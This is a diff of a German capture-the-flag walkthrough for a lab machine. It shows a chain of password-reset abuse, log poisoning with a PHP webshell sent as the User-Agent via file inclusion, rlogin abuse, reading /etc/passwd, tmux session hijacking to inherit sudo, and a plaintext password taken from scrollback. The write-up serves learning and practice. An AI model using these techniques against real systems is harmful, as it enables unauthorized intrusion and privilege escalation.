@@ -13,13 +13,13 @@ techniques: [password-reset, log-poisoning, lfi, reverse-shell, r-services, tmux
 | Attacker IP (tun0) | `<attacker-ip>`                               |
 
 > [!info] Kill Chain
-> [[Password Reset Abuse]] → Admin-Dashboard → [[Mail Poisoning|Log Poisoning]] (via [[Local File Inclusion|LFI]]) → RCE → [[Reverse Shell]] → [[R-Services Abuse]] (rlogin als `sadm`) → [[tmux Hijacking]] (PW-Leak) → [[Sudo Abuse]] (nano) → **root**
+> [[Password Reset Abuse]] → Admin-Dashboard → [[Mail and Log Poisoning|Log Poisoning]] (via [[Local File Inclusion|LFI]]) → RCE → [[Reverse Shell]] → [[R-Services Abuse]] (rlogin als `sadm`) → [[tmux Hijacking]] (PW-Leak) → [[Sudo Abuse]] (nano) → **root**
 
 ---
 
 # 1 · Enumeration
 - `nmap -sC -sV 10.129.234.130` → 5 TCP-Ports offen.
-- **Port 80**: Apache (Ubuntu) → Logs unter `/var/log/apache2/` (`access.log`, `error.log`). Im `access.log` steht der frei wählbare **User-Agent** → potenzieller Log-Poisoning-Träger ([[Mail Poisoning|Log Poisoning]]).
+- **Port 80**: Apache (Ubuntu) → Logs unter `/var/log/apache2/` (`access.log`, `error.log`). Im `access.log` steht der frei wählbare **User-Agent** → potenzieller Log-Poisoning-Träger ([[Mail and Log Poisoning|Log Poisoning]]).
 - **R-Services** (Vorgänger von SSH) → siehe [[R-Services Abuse]]:
 ```
 512/tcp open  exec   netkit-rsh rexecd
@@ -33,7 +33,7 @@ techniques: [password-reset, log-poisoning, lfi, reverse-shell, r-services, tmux
 - `http://10.129.234.130` → Reset-Formular, Passwort für `admin` zurücksetzen.
 - **DevTools → Network → POST → Response**: `new_password: 24bc0464`.
 - Mit `admin` + diesem Passwort einloggen → **Admin-Dashboard** (Log-Viewer mit POST-Parameter `file=`).
-
+- 
 ## 2.2 Session prüfen → [[curl]]
 Log über das Session-Cookie auslesen (`-b PHPSESSID`):
 ```bash
@@ -43,7 +43,7 @@ curl http://10.129.234.130/dashboard.php \
 ```
 => Im Log steht der eigene User-Agent (`Mozilla/5.0 …`) ungeprüft → vergiftbar.
 
-## 2.3 Log Poisoning → [[Mail Poisoning|Log Poisoning]] → RCE
+## 2.3 Log Poisoning → [[Mail and Log Poisoning|Log Poisoning]] → RCE
 **(1)** PHP-Webshell als User-Agent in den Log schreiben:
 ```bash
 curl http://10.129.234.130/ \
@@ -83,7 +83,7 @@ cat /home/sadm/user.txt
 # 3 · Privilege Escalation
 
 ## 3.1 R-Services Abuse → [[R-Services Abuse]]
-- Echte User finden:
+- Echte User finden (Dienstkonten rauswerfen → [[etc-passwd]]):
 ```bash
 grep -vE 'nologin|false' /etc/passwd
 # root ... local (1000) ... sadm (1001)
@@ -102,12 +102,14 @@ rlogin -l sadm 10.129.234.130         # Login ohne Passwort
 ```
 
 ## 3.2 tmux Hijacking → [[tmux Hijacking]]
+- `sudo -l` zeigt `timestamp_timeout=-1` → hat sadm **einmal** `sudo` mit Passwort bestätigt, bleibt die Authentifizierung **unbegrenzt** gültig.
+- Genau diese **bereits authentifizierte** Session läuft noch (`w` → sadm auf `pts/3` in einer tmux-Session). Hänge ich mich dran, erbe ich den gültigen sudo-Zustand → `sudo` ohne erneutes Passwort.
 ```bash
 w                                     # sadm läuft in einer tmux-Session (pts/3)
 ls -la /tmp/tmux-1001/                # Socket: /tmp/tmux-1001/default
 tmux -S /tmp/tmux-1001/default attach
 ```
-=> In der Scrollback-Historie steht das sadm-Passwort im Klartext:
+=> In der Scrollback-Historie der Session sieht man zusätzlich, dass sadm hier `sudo` genutzt hat – inkl. Passwort im Klartext:
 ```
 echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
 ```
